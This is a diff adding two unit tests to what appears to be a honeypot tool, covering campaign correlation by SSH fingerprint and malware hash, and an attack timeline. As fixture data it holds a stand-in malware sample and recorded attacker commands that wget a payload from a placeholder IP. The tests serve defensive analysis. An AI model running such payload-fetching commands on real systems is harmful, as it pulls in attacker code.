@@ -291,6 +291,35 @@ class Store(unittest.TestCase):
         self.assertEqual(first["clients"][0]["name"], "SSH-2.0-Go")
         self.assertEqual(first["latest_session"], "h2")
 
+    def test_campaigns_correlate_shared_fingerprints_and_samples(self):
+        hassh = "16443846184eafde36765c9bab2f4397"
+        self.h.add_session(self.session(session="campaign-a", ip="198.51.100.7", hassh=hassh))
+        self.h.add_session(self.session(session="campaign-b", ip="198.51.100.8", hassh=hassh))
+        data = b"#!/bin/sh\\nwget http://203.0.113.50/payload\\n"
+        ok, sha = self.h.add_sample(data, {"ip": "198.51.100.7"}, quiet=True)
+        self.assertTrue(ok)
+        self.h.add_sample(data, {"ip": "198.51.100.8"}, quiet=True)
+        result = self.h.campaigns(24)
+        fingerprint = next(x for x in result["campaigns"] if x["kind"] == "SSH client fingerprint")
+        sample = next(x for x in result["campaigns"] if x["kind"] == "Malware SHA-256")
+        self.assertEqual(fingerprint["sources"], 2)
+        self.assertEqual(fingerprint["session_ids"], ["campaign-a", "campaign-b"])
+        self.assertEqual(sample["value"], sha)
+        self.assertEqual(sample["sources"], 2)
+        self.assertEqual(sample["confidence"], "high")
+
+    def test_session_includes_ordered_attack_timeline(self):
+        self.h.add_session(self.session(
+            session="timeline1",
+            commands=["whoami", "wget http://203.0.113.50/a"],
+            files=[{"sha256": "a" * 64, "name": "payload.sh", "dir": "download"}]))
+        result = self.h.session("timeline1")
+        self.assertEqual([x["sequence"] for x in result["timeline"]], list(range(1, len(result["timeline"]) + 1)))
+        self.assertEqual(result["timeline"][0]["kind"], "session")
+        self.assertTrue(any(x["stage"] == "Delivery" for x in result["timeline"]))
+        self.assertTrue(any(x["kind"] == "file" and "payload.sh" in x["summary"] for x in result["timeline"]))
+        self.assertIn("per-command timestamps", result["timeline_note"])
+
     def test_session_roundtrip_and_headline_once(self):
         self.assertEqual(self.h.add_session(self.session()), (True, "ok"))
         self.assertEqual(self.h.add_session(self.session()), (True, "ok"))        # re-sent: no second headline hit
